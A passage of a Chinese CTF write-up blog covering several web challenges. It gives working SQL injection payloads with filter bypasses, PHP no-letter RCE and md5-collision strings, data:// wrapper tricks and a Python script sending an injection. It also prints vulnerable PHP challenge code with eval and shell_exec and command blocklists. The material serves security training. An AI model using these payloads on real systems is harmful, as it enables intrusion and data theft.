并且使用了逆反，导致你每次 sql 语句必须在逆反一下才行使用</p>\n</blockquote>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">首先构造语句1&#x27;)union select 1,2,3#然后逆转发现没有回显</span><br><span class=\"line\">那我们构造1&#x27;)union select 1,2#后可以得到回显并且显示了pass在2那我们直接使用2来构造一个payload首先爆出数据库</span><br><span class=\"line\">1&#x27;)union select 1,database()#得到数据库UUCTF</span><br><span class=\"line\">在通过information来爆出表,需要注意的点是or被过滤了也代表了from逆转后的morf不能通过，那我们只有使用双写来达到绕过办法</span><br><span class=\"line\">1&#x27;)union select 1,tabase_name frroon information_schema.tables where table_schema=database()#</span><br><span class=\"line\">之后就得到了表名flag之后我们就要去获取他的字段</span><br><span class=\"line\">1&#x27;)union select 1,column_name frronn information_schema.columns where column_schema=&#x27;flag&#x27;#</span><br><span class=\"line\">然后就得到了字段为UUCTF之后直接爆字段内容</span><br><span class=\"line\">1&#x27;)union select 1,UUCTF frroon flag#</span><br><span class=\"line\">然后得到flag</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"fsctf-2023ez_php1\"><a class=\"anchor\" href=\"#fsctf-2023ez_php1\">#</a> [FSCTF 2023]ez_php1</h5>\n<blockquote>\n<p>满足第一个 php 语法然后再去满足第二个语法，比较难的就是最后一个需要让 new class-&gt;b=&amp;new class-&gt;a</p>\n</blockquote>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class Clazz</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    public $a;</span><br><span class=\"line\">    public $b;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$c=new Clazz();</span><br><span class=\"line\">$c-&gt;b=&amp;$c-&gt;a;</span><br><span class=\"line\">echo serialize($c);</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"swpuctf-2023-秋季新生赛if_else\"><a class=\"anchor\" href=\"#swpuctf-2023-秋季新生赛if_else\">#</a> [SWPUCTF 2023 秋季新生赛] If_else</h5>\n<blockquote>\n<p>没见过这么好的要求让我们自己来操作他的代码 if 判断，那就按照 sql 注入的套路去直接执行命令即可</p>\n</blockquote>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">比如让他的if变成if(1)system(&#x27;ls&#x27;);\\*就能使用命令</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"fsctf-2023巴巴托斯\"><a class=\"anchor\" href=\"#fsctf-2023巴巴托斯\">#</a> [FSCTF 2023] 巴巴托斯！</h5>\n<blockquote>\n<p>按照提示输入他的要求后发现没有其他显示在试试 /etc/passwd 发现能够查看到文件内容，那就很直接的目录查看或者使用 php 伪协议直接读取 flag.php 即可</p>\n</blockquote>\n<h5 id=\"swpu-2018simplephp\"><a class=\"anchor\" href=\"#swpu-2018simplephp\">#</a> [SWPU 2018]SimplePHP</h5>\n<blockquote>\n<p>这个题讲究方法绕过可以利用 preg_match 的绕过比如回溯超出和 %02 截断<br />\n有坑点就是 flag 我找半天找不到太离谱了</p>\n</blockquote>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/bin/cat%20/home/rceservice/flag</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"安洵杯-2019easy_web\"><a class=\"anchor\" href=\"#安洵杯-2019easy_web\">#</a> [安洵杯 2019] easy_web</h5>\n<blockquote>\n<p>这个题考的是 md5 强绕过以及当很多函数被搬掉后该怎么办<br />\n打开就可以看到图片 base64 以及他的 url，这个 url 也有一串加密经过两次 base64 和一次 hex 解密后即可看到文件名，那试试把这个换成 index.php 查看一下源代码，发现可以把 base64 全部 copy 下来进行解密后看到源代码</p>\n</blockquote>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class=\"line\">header(&#x27;content-type:text/html;charset=utf-8&#x27;);</span><br><span class=\"line\">$cmd = $_GET[&#x27;cmd&#x27;];</span><br><span class=\"line\">if (!isset($_GET[&#x27;img&#x27;]) || !isset($_GET[&#x27;cmd&#x27;])) </span><br><span class=\"line\">    header(&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;);</span><br><span class=\"line\">$file = hex2bin(base64_decode(base64_decode($_GET[&#x27;img&#x27;])));</span><br><span class=\"line\"></span><br><span class=\"line\">$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);</span><br><span class=\"line\">if (preg_match(&quot;/flag/i&quot;, $file)) &#123;</span><br><span class=\"line\">    echo &#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;;</span><br><span class=\"line\">    die(&quot;xixi～ no flag&quot;);</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">    $txt = base64_encode(file_get_contents($file));</span><br><span class=\"line\">    echo &quot;&lt;img src=&#x27;data:image/gif;base64,&quot; . $txt . &quot;&#x27;&gt;&lt;/img&gt;&quot;;</span><br><span class=\"line\">    echo &quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">echo $cmd;</span><br><span class=\"line\">echo &quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\&#x27;|\\&quot;|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|&#123;|&#125;|\\(|\\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123;</span><br><span class=\"line\">    echo(&quot;forbid ~&quot;);</span><br><span class=\"line\">    echo &quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">    if ((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) &#123;</span><br><span class=\"line\">        echo `$cmd`;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        echo (&quot;md5 is funny ~&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;style&gt;</span><br><span class=\"line\">  body&#123;</span><br><span class=\"line\">   background:url(./bj.png)  no-repeat center center;</span><br><span class=\"line\">   background-size:cover;</span><br><span class=\"line\">   background-attachment:fixed;</span><br><span class=\"line\">   background-color:#CCCCCC;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&lt;/style&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>这个代码先使用强比较绕过如下</p>\n</blockquote>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br><span class=\"line\">&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>然后即可执行命令有两种方法可以执行，如 sort 和使用 \\ 转义可能会好奇那个 \\ 不是过滤了反斜杠了吗，对的但是我们传进去的样子是经过转义的这个是无法过滤的</p>\n</blockquote>\n<h5 id=\"nctf-2018easy_audit\"><a class=\"anchor\" href=\"#nctf-2018easy_audit\">#</a> [NCTF 2018]Easy_Audit</h5>\n<blockquote>\n<p>数组绕过<br />\n $_REQUEST 变量覆盖<br />\n $_SERVER [‘QUERY_STRING’] 特性<br />\n注意绕过时的方法即可<br />\n<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi mathvariant=\"normal\">_</mi><mi>R</mi><mi>E</mi><mi>Q</mi><mi>U</mi><mi>E</mi><mi>S</mi><mi>T</mi><mtext>有个特性就是当</mtext><mi>G</mi><mi>E</mi><mi>T</mi><mtext>和</mtext><mi>P</mi><mi>O</mi><mi>S</mi><mi>T</mi><mtext>有相同的变量时，匹配</mtext><mi>P</mi><mi>O</mi><mi>S</mi><mi>T</mi><mtext>的变量</mtext></mrow><annotation encoding=\"application/x-tex\">\\_REQUEST有个特性就是当GET和POST有相同的变量时，匹配POST的变量\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.99333em;vertical-align:-0.31em;\"></span><span class=\"mord\" style=\"margin-right:0.02778em;\">_</span><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\">Q</span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">U</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord cjk_fallback\">有</span><span class=\"mord cjk_fallback\">个</span><span class=\"mord cjk_fallback\">特</span><span class=\"mord cjk_fallback\">性</span><span class=\"mord cjk_fallback\">就</span><span class=\"mord cjk_fallback\">是</span><span class=\"mord cjk_fallback\">当</span><span class=\"mord mathnormal\">G</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord cjk_fallback\">和</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord cjk_fallback\">有</span><span class=\"mord cjk_fallback\">相</span><span class=\"mord cjk_fallback\">同</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">变</span><span class=\"mord cjk_fallback\">量</span><span class=\"mord cjk_fallback\">时</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">匹</span><span class=\"mord cjk_fallback\">配</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">变</span><span class=\"mord cjk_fallback\">量</span></span></span></span>_SERVER [‘QUERY_STRING’] 匹配的是原始数据，就是没有 url 编码过的数据，所以可以使用 url 编码绕过</p>\n</blockquote>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php  </span><br><span class=\"line\">highlight_file(__FILE__);  </span><br><span class=\"line\">error_reporting(0);  </span><br><span class=\"line\">if($_REQUEST)&#123;  </span><br><span class=\"line\">    foreach ($_REQUEST as $key =&gt; $value) &#123;  </span><br><span class=\"line\">        if(preg_match(&#x27;/[a-zA-Z]/i&#x27;, $value))   die(&#x27;waf..&#x27;);  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">if($_SERVER)&#123;  </span><br><span class=\"line\">    if(preg_match(&#x27;/yulige|flag|nctf/i&#x27;, $_SERVER[&#x27;QUERY_STRING&#x27;]))  die(&#x27;waf..&#x27;);  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">if(isset($_GET[&#x27;yulige&#x27;]))&#123;  </span><br><span class=\"line\">    if(!(substr($_GET[&#x27;yulige&#x27;], 32) === md5($_GET[&#x27;yulige&#x27;])))&#123;         //日爆md5!!!!!!        die(&#x27;waf..&#x27;);  </span><br><span class=\"line\">    &#125;else&#123;  </span><br><span class=\"line\">        if(preg_match(&#x27;/nctfisfun$/&#x27;, $_GET[&#x27;nctf&#x27;]) &amp;&amp; $_GET[&#x27;nctf&#x27;] !== &#x27;nctfisfun&#x27;)&#123;            $getflag = file_get_contents($_GET[&#x27;flag&#x27;]);  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">        if(isset($getflag) &amp;&amp; $getflag === &#x27;ccc_liubi&#x27;)&#123;  </span><br><span class=\"line\">            include &#x27;flag.php&#x27;;  </span><br><span class=\"line\">            echo $flag;  </span><br><span class=\"line\">        &#125;else die(&#x27;waf..&#x27;);  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125; </span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>使用</p>\n</blockquote>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET: ?%79%75%6C%69%67%65[]=1&amp;%6E%63%74%66=%6E%63%74%66%69%73%66%75%6E%0a&amp;%66%6C%61%67=data://text/plain,ccc_liubi</span><br><span class=\"line\">POST: yulige=1&amp;nctf=2&amp;flag=1</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"hnctf-2022-week1challenge__rce\"><a class=\"anchor\" href=\"#hnctf-2022-week1challenge__rce\">#</a> [HNCTF 2022 Week1]Challenge__rce</h5>\n<blockquote>\n<p>这种题老套路，直接使用自增手法即可进行绕过得到 flag</p>\n</blockquote>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php  </span><br><span class=\"line\">error_reporting(0);  </span><br><span class=\"line\">if (isset($_GET[&#x27;hint&#x27;])) &#123;    highlight_file(__FILE__);  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">if (isset($_POST[&#x27;rce&#x27;])) &#123;    $rce = $_POST[&#x27;rce&#x27;];  </span><br><span class=\"line\">    if (strlen($rce) &lt;= 120) &#123;  </span><br><span class=\"line\">        if (is_string($rce)) &#123;  </span><br><span class=\"line\">            if (!preg_match(&quot;/[!@#%^&amp;*:&#x27;\\-&lt;?&gt;\\&quot;\\/|`a-zA-Z~\\\\\\\\]/&quot;, $rce)) &#123;  </span><br><span class=\"line\">                eval($rce);  </span><br><span class=\"line\">            &#125; else &#123;  </span><br><span class=\"line\">                echo(&quot;Are you hack me?&quot;);  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125; else &#123;  </span><br><span class=\"line\">            echo &quot;I want string!&quot;;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125; else &#123;  </span><br><span class=\"line\">        echo &quot;too long!&quot;;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>传入：</p>\n</blockquote>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rce=%24_%3D%5B%5D._%3B%24__%3D%24_%5B1%5D%3B%24_%3D%24_%5B0%5D%3B%24_%2B%2B%3B%24_1%3D%2B%2B%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D%24_1.%2B%2B%24_.%24__%3B%24_%3D_.%24_(71).%24_(69).%24_(84)%3B%24%24_%5B1%5D(%24%24_%5B2%5D)%3B</span><br><span class=\"line\">使用的get的1和2进行连接的</span><br><span class=\"line\">没有编码之前是</span><br><span class=\"line\">rce=$_=[]._;$__=$_[1];$_=$_[0];$_++;$_1=++$_;$_++;$_++;$_++;$_++;$_=$_1.++$_.$__;$_=_.$_(71).$_(69).$_(84);$$_[1]($$_[2]);</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"wustctf-2020颜值成绩查询\"><a class=\"anchor\" href=\"#wustctf-2020颜值成绩查询\">#</a> [WUSTCTF 2020] 颜值成绩查询</h5>\n<blockquote>\n<p>过滤了 union 和空格，这个题使用大小写绕过即可</p>\n</blockquote>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0&#x27;/**/Union/**/select/**/1,2,3#使用这个可以查看到回显2，3</span><br><span class=\"line\">0&#x27;/**/Union/**/select/**/1,2,database()#使用这个可以查看到数据库</span><br><span class=\"line\">0&#x27;/**/Union/**/select/**/1,2,group_concat(table_name)/**/from/**/information_tables.schema/**/where/**/table_schema=database()#</span><br><span class=\"line\">0&#x27;/**/Union/**/select/**/1,2,group_concat(column_name)/**/from/**/information_columns.schema/**/where/**/column_schema=&#x27;flag&#x27;#</span><br><span class=\"line\">0&#x27;/**/Union/**/select/**/1,2,group_concat(flag,value)/**/from/**/flag#</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>也可以使用布尔盲注如</p>\n</blockquote>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0&#x27;ascii(substr(database(),1,1))=100#</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"swpuctf-2023-秋季新生赛rce-plus\"><a class=\"anchor\" href=\"#swpuctf-2023-秋季新生赛rce-plus\">#</a> [SWPUCTF 2023 秋季新生赛] RCE-PLUS</h5>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php  </span><br><span class=\"line\">error_reporting(0);  </span><br><span class=\"line\">highlight_file(__FILE__);  </span><br><span class=\"line\">function strCheck($cmd)  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">    if(!preg_match(&quot;/\\;|\\&amp;|\\\\$|\\x09|\\x26|more|less|head|sort|tail|sed|cut|awk|strings|od|php|ping|flag/i&quot;, $cmd))&#123;  </span><br><span class=\"line\">        return($cmd);  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">    else&#123;  </span><br><span class=\"line\">        die(&quot;i hate this&quot;);        </span><br><span class=\"line\">      &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">$cmd=$_GET[&#x27;cmd&#x27;];  </span><br><span class=\"line\">strCheck($cmd);  </span><br><span class=\"line\">shell_exec($cmd);  </span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure></p>\n<p>这个 rce 非常简单但是需要注意这个 shell_exec 不会回显就只有使用 &gt; 符号去重定向这个内容再去访问</p>\n<h5 id=\"swpuctf-2023-秋季新生赛一键连接\"><a class=\"anchor\" href=\"#swpuctf-2023-秋季新生赛一键连接\">#</a> [SWPUCTF 2023 秋季新生赛] 一键连接！</h5>\n<p>都使用数组绕过然后在使用一个 data://text/plain, 他的内容即可</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php  </span><br><span class=\"line\">highlight_file(__FILE__);  </span><br><span class=\"line\">error_reporting(0);  </span><br><span class=\"line\">$md5_1 = $_GET[&#x27;md5_1&#x27;];  </span><br><span class=\"line\">$md5_2 = $_GET[&#x27;md5_2&#x27;];  </span><br><span class=\"line\">$sha1_1 = $_GET[&#x27;sha1_1&#x27;];  </span><br><span class=\"line\">$sha1_2 = $_GET[&#x27;sha1_2&#x27;];  </span><br><span class=\"line\">$new_player =$_GET[&#x27;new_player&#x27;];  </span><br><span class=\"line\">if ($md5_1 !== $md5_2 &amp;&amp; md5($md5_1) === md5($md5_2)) &#123;  </span><br><span class=\"line\">    if ($sha1_1 != $sha1_2 &amp;&amp; sha1($sha1_1) === sha1($sha1_2)) &#123;  </span><br><span class=\"line\">        if (file_get_contents($new_player) === &quot;Welcome to NSSCTF!!!&quot;) &#123;  </span><br><span class=\"line\">            echo &quot;Congratulations~~~~~~~~~&quot;;  </span><br><span class=\"line\">            echo &quot;试试need Antsword&lt;br/&gt;&quot;;  </span><br><span class=\"line\">            @eval($_POST[&#x27;Nss&#x27;]);  </span><br><span class=\"line\">        &#125;else&#123;  </span><br><span class=\"line\">            echo &quot;可曾听过data协议?&quot;;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125; else &#123;  </span><br><span class=\"line\">        echo &quot;sha1又如何相等呢&quot;;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125; else &#123;  </span><br><span class=\"line\">    echo &quot;如何让md5值相等呢¿&quot;;  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"护网杯-2018easy_tornado\"><a class=\"anchor\" href=\"#护网杯-2018easy_tornado\">#</a> [护网杯 2018] easy_tornado</h5>\n<p>查看 flag.txt 提供了 flag 的路径，然后 hint 提供了加密方法，看 url 可知道这个题的方法，然后在去 error?msg = 处来使用命令</p>\n<h5 id=\"hnctf-2022-week2easy_sql\"><a class=\"anchor\" href=\"#hnctf-2022-week2easy_sql\">#</a> [HNCTF 2022 WEEK2]easy_sql</h5>\n<p>无字符漏洞</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0&#x27;union/**/select/**/1,2,database()/**/where/**/&#x27;1</span><br><span class=\"line\">Here is your want!</span><br><span class=\"line\">ctf</span><br><span class=\"line\"></span><br><span class=\"line\">0&#x27;union/**/select/**/1,2,group_concat(database_name)/**/from/**/mysql.innodb_table_stats/**/where/**/&#x27;1</span><br><span class=\"line\">Here is your want!</span><br><span class=\"line\">ctf,ctftraining,ctftraining,ctftraining,mysql </span><br><span class=\"line\"></span><br><span class=\"line\">0&#x27;union/**/select/**/1,2,group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/&#x27;1</span><br><span class=\"line\">Here is your want!</span><br><span class=\"line\">ccctttfff,flag,news,users,gtid_slave_pos </span><br><span class=\"line\"></span><br><span class=\"line\">0&#x27;union/**/select/**/1,2,group_concat(`1`)/**/from/**/(select/**/1/**/union/**/select/**/*/**/from/**/ctftraining.flag)a/**/where/**/&#x27;1</span><br><span class=\"line\">Here is your want!</span><br><span class=\"line\">1,NSSCTF&#123;da2750d9-7bb8-4470-9118-ccdfb258d822&#125; </span><br></pre></td></tr></table></figure></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">过滤了 and information_schema 空格</span><br></pre></td></tr></table></figure></p>\n<p>学到一个思路当 #和 --+ 被过滤时我们可以使用 %00</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from urllib import parse</span><br><span class=\"line\"></span><br><span class=\"line\">url=&#x27;http://node2.anna.nssctf.cn:28555/index.php&#x27;</span><br><span class=\"line\">payload=f&quot;0&#x27;/**/union/**/select/**/1,2,group_concat(`2`)/**/from/**/(select/**/2/**/union/**/(select/**/*/**/from/**/ctftraining.flag))a/**/;&#123;parse.unquote(&#x27;%00&#x27;)&#125;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">data=&#123;&quot;id&quot;:payload&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">req=requests.post(url=url,data=data)</span><br><span class=\"line\">print(req.text)</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"roarctf-2019online-proxy\"><a class=\"anchor\" href=\"#roarctf-2019online-proxy\">#</a> [RoarCTF 2019]Online Proxy</h5>\n<p>x-forwarded-for 的二次注入</p>\n<p><figure class=\"highlight 